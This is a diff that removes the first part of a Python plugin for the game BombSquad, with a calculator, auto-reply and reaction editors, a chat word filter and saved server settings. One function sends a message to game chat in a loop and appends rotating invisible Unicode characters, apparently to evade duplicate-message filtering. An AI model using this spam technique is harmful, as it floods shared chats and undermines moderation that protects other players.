@@ -1,2379 +1,616 @@
-from babase import Plugin
-from bauiv1 import (
-    containerwidget as cw,
-    buttonwidget as bw,
-    textwidget as tw,
-    get_special_widget as gsw,
-    getsound as gs,
-    apptimer as teck,
-    UIScale as uis,
-    app as APP,
-    Call,
-    clipboard_is_supported as CIS,
-    scrollwidget as sw
-)
-from bascenev1 import (
-    chatmessage as CM,
-    screenmessage as push,
-    get_chat_messages as GCM,
-    get_game_roster as get_roster,
-    connect_to_party as original_connect,
-    disconnect_from_host as original_disconnect,
-    get_connection_to_host_info_2 as get_connection_info
-)
-import math
-import re
-import time
-import socket
-import threading
-import os
-import bauiv1 as bui
-import bascenev1
-from babase import app
-from bascenev1lib.mainmenu import MainMenuSession
-
-SIGNATURE = "By Mahyar"
-
-DEFAULT_LIMITS = {
-    'vip': 2000.0, 'cbb': 3000.0, 'cba': 50.0, 'h': 1.0,
-    'pun': 1.0, 'sh': 1.0, 'sl': 2.0, 'fr': 2.0,
-    'u': 0.5, 'sp': 50.0, 'z': 100.0, 'g': 100.0,
-    'd': 1.0, 'cu': 3.0, 'k': 1000.0, 're': 200.0,
-    'sm': 500.0, 'fly': 1.0, 'fl': 1.0, 'e': 10.0,
-    'hug': 2.0, 'bot': 1.0, 'spin': 1000.0, 'fire': 50.0,
-    'efs': 1.0, 'spike': 10.0, 'spidy': 100.0, 'rich': 20.0,
-    'fish': 100.0, 'sol': 10.0, 'plasma': 500.0, 'hat': 50.0,
-    'tag': 20.0, 'sig': 1000.0,
-}
-
-DEFAULT_REACTIONS = {'fr': 'u', 'cu': 'h', 'fl': 'fl'}
-DEFAULT_COOLDOWNS = {'fr': 0.15, 'cu': 0.15, 'fl': 0.15}
-DEFAULT_COOLDOWN = 0.15
-DEFAULT_AUTO_REPLIES = {}
-
-
-def get_limits():
-    try:
-        saved = app.config.get('mahyar_limits', None)
-        if saved:
-            d = dict(DEFAULT_LIMITS); d.update(saved); return d
-    except: pass
-    return dict(DEFAULT_LIMITS)
-
-
-def save_limits(limits):
-    try:
-        app.config['mahyar_limits'] = dict(limits); app.config.commit()
-    except: pass
-
-
-def get_reactions():
-    try:
-        saved = app.config.get('mahyar_reactions_v18', None)
-        if saved:
-            d = dict(DEFAULT_REACTIONS); d.update(saved); return d
-    except: pass
-    return dict(DEFAULT_REACTIONS)
-
-
-def save_reactions(reactions):
-    try:
-        app.config['mahyar_reactions_v18'] = dict(reactions); app.config.commit()
-    except: pass
-
-
-def get_cooldowns():
-    try:
-        saved = app.config.get('mahyar_cooldowns_v18', None)
-        if saved:
-            d = dict(DEFAULT_COOLDOWNS); d.update(saved); return d
-    except: pass
-    return dict(DEFAULT_COOLDOWNS)
-
-
-def save_cooldowns(cooldowns):
-    try:
-        app.config['mahyar_cooldowns_v18'] = dict(cooldowns); app.config.commit()
-    except: pass
-
-
-def get_auto_replies():
-    try:
-        saved = app.config.get('mahyar_auto_replies', None)
-        if saved:
-            d = dict(DEFAULT_AUTO_REPLIES); d.update(saved); return d
-    except: pass
-    return dict(DEFAULT_AUTO_REPLIES)
-
-
-def save_auto_replies(replies):
-    try:
-        app.config['mahyar_auto_replies'] = dict(replies); app.config.commit()
-    except: pass
-
-
-def get_spam_settings():
-    try:
-        msg = app.config.get('mahyar_spam_msg', '')
-        delay = app.config.get('mahyar_spam_delay', 2.0)
-        return msg, float(delay)
-    except: return '', 2.0
-
-
-def save_spam_settings(msg, delay):
-    try:
-        app.config['mahyar_spam_msg'] = msg
-        app.config['mahyar_spam_delay'] = float(delay)
-        app.config.commit()
-    except: pass
-
-
-def get_enabled_state(key, default=True):
-    try:
-        return app.config.get(f'mahyar_enabled_{key}', default)
-    except: return default
-
-
-def save_enabled_state(key, value):
-    try:
-        app.config[f'mahyar_enabled_{key}'] = value
-        app.config.commit()
-    except: pass
-
-
-def get_saved_server():
-    try:
-        ip = app.config.get('mahyar_server_ip', '127.0.0.1')
-        port = app.config.get('mahyar_server_port', 43210)
-        return ip, int(port)
-    except:
-        return "127.0.0.1", 43210
-
-
-def save_server(ip, port):
-    try:
-        app.config['mahyar_server_ip'] = ip
-        app.config['mahyar_server_port'] = int(port)
-        app.config.commit()
-    except: pass
-
-
-def get_mods_button_position(default_x=None, default_y=None):
-    try:
-        x = app.config.get('mahyar_mods_btn_x', default_x)
-        y = app.config.get('mahyar_mods_btn_y', default_y)
-        return float(x), float(y)
-    except:
-        return default_x, default_y
-
-
-def save_mods_button_position(x, y):
-    try:
-        app.config['mahyar_mods_btn_x'] = float(x)
-        app.config['mahyar_mods_btn_y'] = float(y)
-        app.config.commit()
-    except:
-        pass
-
-
-def get_filter_words():
-    try:
-        return list(app.config.get('mahyar_filter_words', []))
-    except:
-        return []
-
-
-def save_filter_words(words):
-    try:
-        app.config['mahyar_filter_words'] = list(words)
-        app.config.commit()
-    except:
-        pass
-
-
-def get_filter_reply():
-    try:
-        return app.config.get('mahyar_filter_reply', 'u')
-    except:
-        return 'u'
-
-
-def save_filter_reply(value):
-    try:
-        app.config['mahyar_filter_reply'] = str(value)
-        app.config.commit()
-    except:
-        pass
-
-
-auto_react_enabled = get_enabled_state('react', True)
-auto_reply_enabled = get_enabled_state('reply', True)
-auto_buyer_enabled = get_enabled_state('buyer', True)
-filter_enabled = get_enabled_state('filter', True)
-
-processed_sell_ids = set()
-processed_buy_ids = set()
-react_cooldown = {}
-_reaction_pattern_cache = {}
-auto_reply_cooldown = {}
-filter_cooldown = {}
-
-spam_active = False
-spam_message = ""
-spam_delay = 2.0
-spam_counter = 0
-spam_timer = None
-
-server_ip, server_port = get_saved_server()
-current_ping = 0.0
-ping_thread = None
-
-auto_reconnect_enabled = False
-auto_reconnect_busy = False
-
-my_own_name = None
-my_own_client_id = None
-my_own_display_num = None
-
-# ============================================================
-# AutoBuyer - دقیقاً منطق fastBuy_V2_16
-# ============================================================
-_sod = False
-_lasch = ""
-_max_price = 100000
-
-# Snapshotهای جداگانه برای جلوگیری از جا افتادن پیام‌ها در burstهای چت
-_last_seen_messages = None
-_buyer_seen_messages = None
-_buyer_pending_id = None
-_buyer_pending_since = 0.0
-_buyer_queue = []
-
-_limits_cache = None
-_limits_cache_time = 0
-
-
-def _get_cached_limits():
-    global _limits_cache, _limits_cache_time
-    now = time.time()
-    if _limits_cache is None or (now - _limits_cache_time) > 0.1:
-        try:
-            _limits_cache = get_limits()
-            _limits_cache_time = now
-        except:
-            return get_limits()
-    return _limits_cache
-
-
-class AR:
-    @classmethod
-    def UIS(c=0):
-        i = APP.ui_v1.uiscale
-        return [1.5, 1.1, 0.8][0 if i == uis.SMALL else 1 if i == uis.MEDIUM else 2]
-
-    @classmethod
-    def add_close_button(c, window, position=(10, 10)):
-        return bw(
-            parent=window, size=(24, 24), position=position, label='X',
-            color=(0.6, 0.15, 0.25), textcolor=(1, 1, 1),
-            on_activate_call=Call(c.swish, t=window)
-        )
-
-    @classmethod
-    def bw(c, **k):
-        return bw(**k, textcolor=(1, 1, 1), enable_sound=False, button_type='square')
-
-    @classmethod
-    def cw(c, source, ps=0, **k):
-        o = source.get_screen_space_center() if source else None
-        r = cw(
-            **k, scale=c.UIS() + ps, transition='in_scale',
-            color=(0.12, 0.14, 0.2), parent=gsw('overlay_stack'),
-            scale_origin_stack_offset=o
-        )
-        cw(r, on_outside_click_call=Call(c.swish, t=r))
-        return r
-
-    swish = lambda c=0, t=0: (gs('swish').play(), cw(t, transition='out_scale') if t else t)
-    err = lambda t: (gs('block').play(), push(t, color=(1, 1, 0)))
-
-
-def get_my_ids():
-    global my_own_client_id, my_own_display_num, my_own_name
-    try:
-        roster = get_roster()
-        if not my_own_name:
-            return None, None
-        for entry in roster:
-            display = entry.get('display_string', '')
-            if display.endswith(my_own_name):
-                my_own_client_id = entry.get('client_id')
-                players = entry.get('players', [])
-                if players:
-                    name_full = players[0].get('name_full', '')
-                    m = re.match(r'^\s*(\d+)', name_full)
-                    if m:
-                        my_own_display_num = int(m.group(1))
-                    else:
-                        my_own_display_num = None
-                return my_own_client_id, my_own_display_num
-        return None, None
-    except Exception as e:
-        print(f"Error getting IDs: {e}")
-        return None, None
-
-
-def safe_chat_send(message):
-    try:
-        CM(message)
-    except Exception as e:
-        print(f"Chat send error: {e}")
-
-
-original_connect_to_party = original_connect
-
-def new_connect_to_party(address, port=43210, print_progress=False):
-    global server_ip, server_port
-    server_ip = address
-    server_port = port
-    save_server(address, port)
-    push(f'Saved server: {address}:{port}', color=(0, 1, 1))
-    return original_connect_to_party(address, port, print_progress)
-
-
-bascenev1.connect_to_party = new_connect_to_party
-
-
-def check_auto_reply(msg):
-    if not auto_reply_enabled: return False
-    try:
-        sender = None; content = msg
-        if ': ' in msg:
-            parts = msg.split(': ', 1)
-            sender = parts[0].strip(); content = parts[1].strip()
-        if sender and my_own_name:
-            if sender == my_own_name: return False
-
-        content_stripped = content.strip().lower()
-
-        for keyword, response in get_auto_replies().items():
-            kw_lower = keyword.lower().strip()
-
-            if content_stripped == kw_lower:
-                cd_key = f"{keyword}_{sender or 'unknown'}"
-                current_time = time.time()
-                last_time = auto_reply_cooldown.get(cd_key, 0)
-                if current_time - last_time < 2.0: continue
-                auto_reply_cooldown[cd_key] = current_time
-                if len(auto_reply_cooldown) > 50:
-                    now = time.time()
-                    to_del = [k for k, v in auto_reply_cooldown.items() if now - v > 60]
-                    for k in to_del: del auto_reply_cooldown[k]
-                safe_chat_send(response)
-                try: gs('dingSmall').play()
-                except: pass
-                return True
-    except Exception as e:
-        print(f"Auto-Reply error: {e}")
-    return False
-
-
-def check_filter(msg):
-    if not filter_enabled: return False
-    try:
-        sender = None; content = msg
-        if ': ' in msg:
-            parts = msg.split(': ', 1)
-            sender = parts[0].strip(); content = parts[1].strip()
-
-        if sender and my_own_name and sender == my_own_name:
-            return False
-
-        words = get_filter_words()
-        if not words:
-            return False
-
-        content_lower = content.lower()
-        for word in words:
-            if word and word in content_lower:
-                reply = get_filter_reply()
-                cd_key = f"filter_{sender or 'unknown'}"
-                current_time = time.time()
-                last_time = filter_cooldown.get(cd_key, 0)
-                if current_time - last_time < 2.0:
-                    continue
-                filter_cooldown[cd_key] = current_time
-                if len(filter_cooldown) > 50:
-                    now = time.time()
-                    to_del = [k for k, v in filter_cooldown.items() if now - v > 60]
-                    for k in to_del: del filter_cooldown[k]
-                safe_chat_send(reply)
-                try: gs('dingSmall').play()
-                except: pass
-                return True
-    except Exception as e:
-        print(f"Filter error: {e}")
-    return False
-
-
-INVISIBLE_CHARS = ['', '\u200b', '\u200c', '\u200d', '\u2060', '\u180e', '\ufeff', '\u200e', '\u200f', '\u2061']
-
-
-def spam_send():
-    global spam_active, spam_message, spam_delay, spam_timer, spam_counter
-    if not spam_active: return
-    try:
-        suffix = INVISIBLE_CHARS[spam_counter % len(INVISIBLE_CHARS)]
-        spam_counter += 1
-        if spam_counter >= 100: spam_counter = 0
-        safe_chat_send(spam_message + suffix)
-        spam_timer = teck(spam_delay, spam_send)
-    except:
-        spam_active = False
-
-
-def start_spam(message, delay=2.0):
-    global spam_active, spam_message, spam_delay, spam_counter
-    if spam_active: return
-    spam_active = True
-    spam_message = message
-    spam_delay = float(delay)
-    spam_counter = 0
-    save_spam_settings(message, delay)
-    spam_send()
-    push(f"Spam Started: {message}", color=(0, 1, 0))
-
-
-def stop_spam():
-    global spam_active, spam_timer
-    if spam_timer:
-        try: spam_timer.cancel()
-        except: pass
-        spam_timer = None
-    spam_active = False
-    push("Spam Stopped", color=(1, 0.5, 0))
-
-
-class Calculator:
-    def __init__(s, source):
-        s.w = AR.cw(source=source, size=(260, 350), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(235, 320))
-        tw(parent=s.w, text='Math Engine', scale=0.8, position=(130, 315), h_align='center', color=(1, 0.5, 0.9))
-        s.display = tw(parent=s.w, text='0', scale=1.0, position=(130, 275), h_align='center', color=(0.3, 1, 0.7), maxwidth=230)
-        s.expression = tw(parent=s.w, text='', scale=0.45, position=(130, 255), h_align='center', color=(0.9, 0.7, 1), maxwidth=230)
-        s.current_input = '0'
-        s.previous_input = ''
-        s.operation = None
-        s.reset_next_input = False
-        s.last_expression = ''
-        bw(parent=s.w, label='Copy', size=(110, 22), position=(15, 225), on_activate_call=Call(s.copy_result), color=(0.4, 0.3, 0.7), textcolor=(1, 1, 1), button_type='square', text_scale=0.6)
-        bw(parent=s.w, label='Send', size=(110, 22), position=(135, 225), on_activate_call=Call(s.send_to_chat), color=(0.7, 0.4, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.6)
-        row_y = 195
-        row_gap = 27
-        btn_h = 22
-        rows = [
-            [('AC', s.clear_all, (15, row_y), (35, btn_h), (0.7, 0.2, 0.3)), ('+/-', s.toggle_sign, (55, row_y), (35, btn_h), (0.3, 0.4, 0.7)), ('%', s.percentage, (95, row_y), (35, btn_h), (0.3, 0.4, 0.7)), ('R', s.square_root, (135, row_y), (35, btn_h), (0.3, 0.4, 0.7)), ('x2', s.square, (175, row_y), (35, btn_h), (0.3, 0.4, 0.7)), ('÷', lambda: s.set_operation('/'), (215, row_y), (30, btn_h), (0.8, 0.6, 0.1))],
-            [('7', lambda: s.append_number('7'), (15, row_y-row_gap), (35, btn_h), (0.25, 0.3, 0.45)), ('8', lambda: s.append_number('8'), (55, row_y-row_gap), (35, btn_h), (0.25, 0.3, 0.45)), ('9', lambda: s.append_number('9'), (95, row_y-row_gap), (35, btn_h), (0.25, 0.3, 0.45)), ('×', lambda: s.set_operation('*'), (135, row_y-row_gap), (35, btn_h), (0.8, 0.6, 0.1)), ('DEL', s.backspace, (175, row_y-row_gap), (35, btn_h), (0.6, 0.15, 0.25)), ('1/x', s.reciprocal, (215, row_y-row_gap), (30, btn_h), (0.3, 0.4, 0.7))],
-            [('4', lambda: s.append_number('4'), (15, row_y-row_gap*2), (35, btn_h), (0.25, 0.3, 0.45)), ('5', lambda: s.append_number('5'), (55, row_y-row_gap*2), (35, btn_h), (0.25, 0.3, 0.45)), ('6', lambda: s.append_number('6'), (95, row_y-row_gap*2), (35, btn_h), (0.25, 0.3, 0.45)), ('-', lambda: s.set_operation('-'), (135, row_y-row_gap*2), (35, btn_h), (0.8, 0.6, 0.1)), ('n!', s.factorial, (175, row_y-row_gap*2), (35, btn_h), (0.3, 0.4, 0.7)), ('log', s.logarithm, (215, row_y-row_gap*2), (30, btn_h), (0.3, 0.4, 0.7))],
-            [('1', lambda: s.append_number('1'), (15, row_y-row_gap*3), (35, btn_h), (0.25, 0.3, 0.45)), ('2', lambda: s.append_number('2'), (55, row_y-row_gap*3), (35, btn_h), (0.25, 0.3, 0.45)), ('3', lambda: s.append_number('3'), (95, row_y-row_gap*3), (35, btn_h), (0.25, 0.3, 0.45)), ('+', lambda: s.set_operation('+'), (135, row_y-row_gap*3), (35, btn_h), (0.8, 0.6, 0.1)), ('^', s.power, (175, row_y-row_gap*3), (35, btn_h), (0.3, 0.4, 0.7)), ('pi', s.pi_value, (215, row_y-row_gap*3), (30, btn_h), (0.5, 0.3, 0.7))],
-            [('0', lambda: s.append_number('0'), (15, row_y-row_gap*4), (75, btn_h), (0.25, 0.3, 0.45)), ('.', s.add_decimal, (95, row_y-row_gap*4), (35, btn_h), (0.25, 0.3, 0.45)), ('=', s.calculate, (135, row_y-row_gap*4), (35, btn_h), (0.15, 0.65, 0.35)), ('e', s.e_value, (175, row_y-row_gap*4), (35, btn_h), (0.5, 0.3, 0.7)), ('!', s.factorial, (215, row_y-row_gap*4), (30, btn_h), (0.3, 0.4, 0.7))],
-        ]
-        for row in rows:
-            for label, callback, pos, size, color in row:
-                bw(parent=s.w, label=label, size=size, position=pos, on_activate_call=callback, color=color, textcolor=(1, 1, 1), button_type='square', text_scale=0.6)
-        AR.swish()
-
-    def append_number(s, number):
-        if s.reset_next_input:
-            s.current_input = '0'; s.reset_next_input = False
-        current = s.current_input
-        s.current_input = number if current == '0' else current + number
-        s.update_display(); gs('click01').play()
-    def add_decimal(s):
-        if s.reset_next_input:
-            s.current_input = '0'; s.reset_next_input = False
-        current = s.current_input
-        if '.' not in current:
-            s.current_input = current + '.'; s.update_display(); gs('click01').play()
-    def backspace(s):
-        current = s.current_input
-        if current != '0' and len(current) > 1: current = current[:-1]
-        else: current = '0'
-        s.current_input = current; s.update_display(); gs('swish').play()
-    def update_display(s):
-        try:
-            if s.display.exists(): tw(s.display, text=s.current_input)
-        except: pass
-    def set_operation(s, op):
-        if s.operation and not s.reset_next_input: s.calculate()
-        s.previous_input = s.current_input; s.operation = op; s.reset_next_input = True
-        op_symbol = {'+': '+', '-': '-', '*': '×', '/': '÷', '**': '^'}.get(op, op)
-        try:
-            if s.expression.exists(): tw(s.expression, text=f"{s.current_input} {op_symbol}")
-        except: pass
-        gs('click01').play()
-    def calculate(s):
-        try:
-            if not s.operation or s.reset_next_input: return
-            num1 = float(s.previous_input); num2 = float(s.current_input)
-            op_symbol = {'+': '+', '-': '-', '*': '×', '/': '÷', '**': '^'}.get(s.operation, s.operation)
-            s.last_expression = f"{s.previous_input} {op_symbol} {s.current_input}"
-            if s.operation == '+': result = num1 + num2
-            elif s.operation == '-': result = num1 - num2
-            elif s.operation == '*': result = num1 * num2
-            elif s.operation == '/':
-                if num2 == 0: raise ZeroDivisionError
-                result = num1 / num2
-            elif s.operation == '**': result = num1 ** num2
-            else: return
-            result_str = str(int(result)) if result == int(result) else str(round(result, 10))
-            s.current_input = result_str; s.last_expression += f" = {result_str}"
-            try:
-                if s.expression.exists(): tw(s.expression, text=s.last_expression)
-            except: pass
-            s.operation = None; s.reset_next_input = True; s.update_display(); gs('dingSmallHigh').play()
-        except: s.current_input = 'Error'; s.update_display(); gs('error').play(); teck(2.0, s.clear_all)
-    def clear_all(s):
-        s.current_input = '0'; s.previous_input = ''; s.operation = None; s.reset_next_input = False; s.last_expression = ''
-        s.update_display()
-        try:
-            if s.expression.exists(): tw(s.expression, text='')
-        except: pass
-        gs('swish').play()
-    def toggle_sign(s):
-        if s.current_input != '0':
-            if s.current_input.startswith('-'): s.current_input = s.current_input[1:]
-            else: s.current_input = '-' + s.current_input
-            s.update_display(); gs('click01').play()
-    def percentage(s):
-        try: s.current_input = str(float(s.current_input) / 100); s.update_display(); gs('dingSmall').play()
-        except: s.current_input = '0'; s.update_display()
-    def square(s):
-        try:
-            v = float(s.current_input); result = v ** 2
-            s.current_input = str(int(result)) if result == int(result) else str(round(result, 10))
-            s.update_display(); gs('dingSmall').play()
-        except: AR.err('Error!')
-    def square_root(s):
-        try:
-            v = float(s.current_input)
-            if v < 0: raise ValueError
-            result = math.sqrt(v)
-            s.current_input = str(int(result)) if result == int(result) else str(round(result, 10))
-            s.update_display(); gs('dingSmall').play()
-        except: AR.err('Error!')
-    def reciprocal(s):
-        try:
-            v = float(s.current_input)
-            if v == 0: raise ZeroDivisionError
-            result = 1 / v
-            s.current_input = str(int(result)) if result == int(result) else str(round(result, 10))
-            s.update_display(); gs('dingSmall').play()
-        except: AR.err('Error!')
-    def factorial(s):
-        try:
-            v = int(float(s.current_input))
-            if v < 0 or v > 170: raise ValueError
-            result = math.factorial(v); s.current_input = str(result)
-            s.update_display(); gs('dingSmall').play()
-        except: AR.err('Error!')
-    def logarithm(s):
-        try:
-            v = float(s.current_input)
-            if v <= 0: raise ValueError
-            result = math.log10(v); s.current_input = str(round(result, 6))
-            s.update_display(); gs('dingSmall').play()
-        except: AR.err('Error!')
-    def power(s): s.set_operation('**')
-    def pi_value(s):
-        s.current_input = str(round(math.pi, 10)); s.reset_next_input = True
-        s.update_display(); gs('dingSmall').play()
-    def e_value(s):
-        s.current_input = str(round(math.e, 10)); s.reset_next_input = True
-        s.update_display(); gs('dingSmall').play()
-    def copy_result(s):
-        try:
-            if CIS():
-                from babase import clipboard_set_text
-                text = s.last_expression if s.last_expression else s.current_input
-                clipboard_set_text(text); bui.screenmessage(f'Copied: {text}', color=(0, 1, 0)); gs('dingSmall').play()
-            else: AR.err('Clipboard not supported!')
-        except Exception as e: AR.err(f'Copy error: {str(e)}')
-    def send_to_chat(s):
-        try:
-            message = f"{s.last_expression}" if s.last_expression else f"{s.current_input}"
-            safe_chat_send(message); bui.screenmessage(f'Sent: {message}', color=(0, 1, 0)); gs('dingSmall').play()
-        except Exception as e: AR.err(f'Send error: {str(e)}')
-
-
-class EditReactionWindow:
-    def __init__(s, source, trigger_code, parent_window=None):
-        s.trigger_code = trigger_code
-        s.parent_window = parent_window
-        s.w = AR.cw(source=source, size=(260, 200), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(230, 165))
-        current = get_reactions().get(trigger_code, '')
-        current_cd = get_cooldowns().get(trigger_code, DEFAULT_COOLDOWN)
-        tw(parent=s.w, text=f'Edit "%{trigger_code}"', scale=0.75, position=(130, 160), h_align='center', color=(1, 1, 0))
-        tw(parent=s.w, text='Reply with:', scale=0.5, position=(130, 140), h_align='center', color=(0.8, 0.8, 1))
-        s.input = tw(parent=s.w, text=current, editable=True, scale=0.8, position=(25, 105), size=(210, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        tw(parent=s.w, text='Cooldown (sec):', scale=0.5, position=(130, 80), h_align='center', color=(0.8, 0.8, 1))
-        s.cd_input = tw(parent=s.w, text=str(current_cd), editable=True, scale=0.8, position=(25, 50), size=(210, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        bw(parent=s.w, label='Save', size=(110, 28), position=(75, 10), on_activate_call=Call(s.save), color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-        gs('swish').play()
-    def save(s):
-        value = tw(query=s.input).strip().lower()
-        current_reactions = get_reactions()
-        current_cooldowns = get_cooldowns()
-        if value:
-            current_reactions[s.trigger_code] = value
-        else:
-            if s.trigger_code in current_reactions: del current_reactions[s.trigger_code]
-            if s.trigger_code in current_cooldowns: del current_cooldowns[s.trigger_code]
-            save_reactions(current_reactions); save_cooldowns(current_cooldowns)
-            bui.screenmessage(f'%{s.trigger_code} disabled', color=(1, 0.5, 0))
-            gs('dingSmallHigh').play()
-            if s.parent_window:
-                try: s.parent_window.build_grid()
-                except: pass
-            AR.swish(s.w); return
-        try: cd_value = float(tw(query=s.cd_input).strip())
-        except: cd_value = DEFAULT_COOLDOWN
-        if cd_value < 0: cd_value = 0
-        current_reactions[s.trigger_code] = value
-        current_cooldowns[s.trigger_code] = cd_value
-        save_reactions(current_reactions); save_cooldowns(current_cooldowns)
-        bui.screenmessage(f'%{s.trigger_code} -> {value}', color=(0, 1, 0))
-        gs('dingSmallHigh').play()
-        if s.parent_window:
-            try: s.parent_window.build_grid()
-            except: pass
-        AR.swish(s.w)
-
-
-class AddReactionWindow:
-    def __init__(s, source, parent_window=None):
-        s.parent_window = parent_window
-        s.w = AR.cw(source=source, size=(260, 240), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(230, 205))
-        tw(parent=s.w, text='Add New', scale=0.8, position=(130, 200), h_align='center', color=(1, 1, 0))
-        tw(parent=s.w, text='When %:', scale=0.5, position=(130, 172), h_align='center', color=(1, 1, 1))
-        s.trigger_input = tw(parent=s.w, text='', editable=True, scale=0.8, position=(25, 142), size=(210, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        tw(parent=s.w, text='Reply:', scale=0.5, position=(130, 115), h_align='center', color=(1, 1, 1))
-        s.response_input = tw(parent=s.w, text='', editable=True, scale=0.8, position=(25, 85), size=(210, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        tw(parent=s.w, text='Cooldown (sec):', scale=0.5, position=(130, 58), h_align='center', color=(1, 1, 1))
-        s.cd_input = tw(parent=s.w, text=str(DEFAULT_COOLDOWN), editable=True, scale=0.8, position=(25, 28), size=(210, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        bw(parent=s.w, label='Add', size=(120, 30), position=(70, -5), on_activate_call=Call(s.save), color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-        gs('swish').play()
-    def save(s):
-        trigger = tw(query=s.trigger_input).strip().lower()
-        response = tw(query=s.response_input).strip().lower()
-        if not trigger or not response:
-            AR.err('Both required!'); return
-        try: cd_value = float(tw(query=s.cd_input).strip())
-        except: cd_value = DEFAULT_COOLDOWN
-        if cd_value < 0: cd_value = 0
-        current_reactions = get_reactions()
-        current_cooldowns = get_cooldowns()
-        current_reactions[trigger] = response
-        current_cooldowns[trigger] = cd_value
-        save_reactions(current_reactions); save_cooldowns(current_cooldowns)
-        bui.screenmessage(f'%{trigger} -> {response}', color=(0, 1, 0))
-        gs('dingSmallHigh').play()
-        if s.parent_window:
-            try: s.parent_window.build_grid()
-            except: pass
-        AR.swish(s.w)
-
-
-class ReactionEditorWindow:
-    def __init__(s, source, parent_window=None):
-        s.parent_window = parent_window
-        s.w = AR.cw(source=source, size=(300, 380), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(270, 345))
-        tw(parent=s.w, text='Auto React', scale=0.9, position=(150, 340), h_align='center', color=(0, 1, 1))
-        s.id_text = tw(parent=s.w, text=f'cid={my_own_client_id or "?"} num={my_own_display_num if my_own_display_num is not None else "?"}', position=(150, 308), scale=0.35, h_align='center', color=(0, 1, 1))
-        s.scroll = sw(parent=s.w, size=(260, 160), position=(20, 145))
-        s.container = cw(parent=s.scroll, size=(240, 300), background=False)
-        s.item_buttons = {}
-        s.build_grid()
-        bw(parent=s.w, label='+ Add', size=(75, 26), position=(20, 108), on_activate_call=Call(s.add_new), color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1), button_type='square', text_scale=0.55)
-        bw(parent=s.w, label='Reset', size=(75, 26), position=(105, 108), on_activate_call=Call(s.reset_all), color=(0.7, 0.3, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.55)
-        bw(parent=s.w, label='IDs', size=(75, 26), position=(190, 108), on_activate_call=Call(s.refresh_ids), color=(0.4, 0.3, 0.7), textcolor=(1, 1, 1), button_type='square', text_scale=0.55)
-        s.toggle_btn = bw(parent=s.w, label='ON' if auto_react_enabled else 'OFF', size=(260, 28), position=(20, 72), on_activate_call=Call(s.toggle), color=(0.2, 0.7, 0.2) if auto_react_enabled else (0.7, 0.2, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-        gs('swish').play()
-    def build_grid(s):
-        current_reactions = get_reactions()
-        current_cooldowns = get_cooldowns()
-        for child in s.container.get_children(): child.delete()
-        s.item_buttons.clear()
-        items = list(current_reactions.items())
-        row_height = 30
-        total_h = len(items) * row_height + 20
-        for i, (trigger, response) in enumerate(items):
-            y = total_h - (i + 1) * row_height
-            cd = current_cooldowns.get(trigger, DEFAULT_COOLDOWN)
-            btn = bw(parent=s.container, label=f'%{trigger} -> {response} ({cd}s)', size=(165, 24), position=(5, y), on_activate_call=Call(s.edit_item, trigger), color=(0.25, 0.4, 0.6), textcolor=(1, 1, 1), button_type='square', text_scale=0.45)
-            s.item_buttons[trigger] = btn
-            bw(parent=s.container, label='X', size=(25, 24), position=(175, y), on_activate_call=Call(s.delete_item, trigger), color=(0.7, 0.2, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.6)
-        cw(s.container, size=(240, total_h))
-    def refresh_ids(s):
-        cid, num = get_my_ids()
-        display_num = num if num is not None else "?"
-        tw(s.id_text, text=f'cid={cid or "?"} num={display_num}', color=(0, 1, 0))
-        bui.screenmessage(f'cid={cid}, num={display_num}', color=(0, 1, 0))
-        gs('dingSmallHigh').play()
-    def add_new(s): AddReactionWindow(s.w, parent_window=s)
-    def edit_item(s, trigger): EditReactionWindow(s.w, trigger_code=trigger, parent_window=s)
-    def delete_item(s, trigger):
-        current_reactions = get_reactions()
-        current_cooldowns = get_cooldowns()
-        if trigger in current_reactions: del current_reactions[trigger]
-        if trigger in current_cooldowns: del current_cooldowns[trigger]
-        save_reactions(current_reactions); save_cooldowns(current_cooldowns)
-        bui.screenmessage(f'Deleted: %{trigger}', color=(1, 0.5, 0)); gs('dingSmallLow').play()
-        s.build_grid()
-    def reset_all(s):
-        save_reactions(dict(DEFAULT_REACTIONS))
-        save_cooldowns(dict(DEFAULT_COOLDOWNS))
-        bui.screenmessage('Reset!', color=(0, 1, 1)); gs('dingSmallHigh').play()
-        s.build_grid()
-    def toggle(s):
-        global auto_react_enabled
-        auto_react_enabled = not auto_react_enabled
-        save_enabled_state('react', auto_react_enabled)
-        if auto_react_enabled:
-            bw(s.toggle_btn, label='ON', color=(0.2, 0.7, 0.2)); bui.screenmessage('React ON', color=(0, 1, 0))
-        else:
-            bw(s.toggle_btn, label='OFF', color=(0.7, 0.2, 0.2)); bui.screenmessage('React OFF', color=(1, 0.5, 0))
-        gs('dingSmall').play()
-
-
-class EditAutoReplyWindow:
-    def __init__(s, source, keyword, parent_window=None):
-        s.keyword = keyword; s.parent_window = parent_window
-        s.w = AR.cw(source=source, size=(260, 180), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(230, 145))
-        current = get_auto_replies().get(keyword, '')
-        tw(parent=s.w, text=f'Edit "{keyword}"', scale=0.75, position=(130, 140), h_align='center', color=(1, 1, 0))
-        tw(parent=s.w, text='Reply:', scale=0.5, position=(130, 118), h_align='center', color=(0.8, 0.8, 1))
-        s.input = tw(parent=s.w, text=current, editable=True, scale=0.8, position=(25, 82), size=(210, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        bw(parent=s.w, label='Save', size=(80, 28), position=(35, 30), on_activate_call=Call(s.save), color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-        bw(parent=s.w, label='Delete', size=(80, 28), position=(145, 30), on_activate_call=Call(s.delete), color=(0.7, 0.2, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
